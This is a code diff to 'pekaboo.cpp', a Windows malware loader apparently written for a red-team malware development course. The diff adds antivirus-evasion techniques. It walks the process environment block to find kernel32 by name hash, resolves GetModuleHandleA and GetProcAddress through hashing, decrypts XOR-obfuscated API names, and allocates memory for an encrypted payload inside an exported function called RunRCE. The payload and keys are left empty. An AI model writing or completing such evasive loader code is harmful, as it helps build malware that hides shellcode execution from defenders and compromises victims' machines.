@@ -7,6 +7,10 @@ pekaboo.cpp - inspired by RTO malware development course implementation
 #include <stdlib.h>
 #include <string.h>
 
+#define KERNEL32_HASH 0x00000000
+#define GETMODULEHANDLE_HASH 0x00000000
+#define GETPROCADDRESS_HASH 0x00000000
+
 // encrypted payload
 unsigned char my_payload[] = { };
 
@@ -32,7 +36,31 @@ char s_ct_key[] = "";
 char s_wfso_key[] = "";
 char s_rmm_key[] = "";
 
-LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef struct _UNICODE_STRING {
+  USHORT Length;
+  USHORT MaximumLength;
+  PWSTR Buffer;
+} UNICODE_STRING;
+
+struct LDR_MODULE {
+  LIST_ENTRY e[3];
+  HMODULE base;
+  void* entry;
+  UINT size;
+  UNICODE_STRING dllPath;
+  UNICODE_STRING dllname;
+};
+
+// LPVOID (WINAPI * ppVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+
+typedef PVOID(WINAPI *pVirtualAlloc)(
+  LPVOID lpAddress,
+  SIZE_T dwSize,
+  DWORD  flAllocationType,
+  DWORD  flProtect
+);
+
+
 BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
@@ -40,6 +68,15 @@ VOID (WINAPI * pRtlMoveMemory)(
   _Out_       VOID UNALIGNED *Destination,
   _In_  const VOID UNALIGNED *Source,
   _In_        SIZE_T         Length
+);
+
+typedef HMODULE(WINAPI *pGetModuleHandleA)(
+  LPCSTR lpModuleName
+);
+
+typedef FARPROC(WINAPI *pGetProcAddress)(
+  HMODULE hModule,
+  LPCSTR  lpProcName
 );
 
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
@@ -59,6 +96,42 @@ DWORD calcMyHash(char* data) {
     hash += data[i] + (hash << 1);
   }
   return hash;
+}
+
+static DWORD calcMyHashBase(LDR_MODULE* mdll) {
+  char name[64];
+  size_t i = 0;
+
+  while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
+    name[i] = (char)mdll->dllname.Buffer[i];
+    i++;
+  }
+  name[i] = 0;
+  return calcMyHash((char *)CharLowerA(name));
+}
+
+static HMODULE getKernel32(DWORD myHash) {
+  HMODULE kernel32;
+  INT_PTR peb = __readgsqword(0x60);
+  auto modList = 0x18;
+  auto modListFlink = 0x18;
+  auto kernelBaseAddr = 0x10;
+
+  auto mdllist = *(INT_PTR*)(peb + modList);
+  auto mlink = *(INT_PTR*)(mdllist + modListFlink);
+  auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);
+  auto mdl = (LDR_MODULE*)mlink;
+  do {
+    mdl = (LDR_MODULE*)mdl->e[0].Flink;
+    if (mdl->base != nullptr) {
+      if (calcMyHashBase(mdl) == myHash) { // kernel32.dll hash
+        break;
+      }
+    }
+  } while (mlink != (INT_PTR)mdl);
+
+  kernel32 = (HMODULE)mdl->base;
+  return kernel32;
 }
 
 static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
@@ -99,12 +172,20 @@ __declspec(dllexport) BOOL WINAPI RunRCE(void) {
   HANDLE th;
   DWORD oldprotect = 0;
 
+  HMODULE mod = getKernel32(KERNEL32_HASH);
+  pGetModuleHandleA myGetModuleHandleA = (pGetModuleHandleA)getAPIAddr(mod, GETMODULEHANDLE_HASH);
+  pGetProcAddress myGetProcAddress = (pGetProcAddress)getAPIAddr(mod, GETPROCADDRESS_HASH);
+  HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
+
   // decrypt VirtualAlloc
   XOR((char *) s_va, s_va_len, s_va_key, sizeof(s_va_key));
-  pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), s_va);
+  // ppVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), s_va);
+  pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)myGetProcAddress(hk32, s_va);
+  // printf("%d\n", myGetProcAddress(hk32, s_va));
 
   // allocate memory for payload
-  exec_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  // exec_mem = ppVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  exec_mem = myVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
   // decrypt payload
   XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
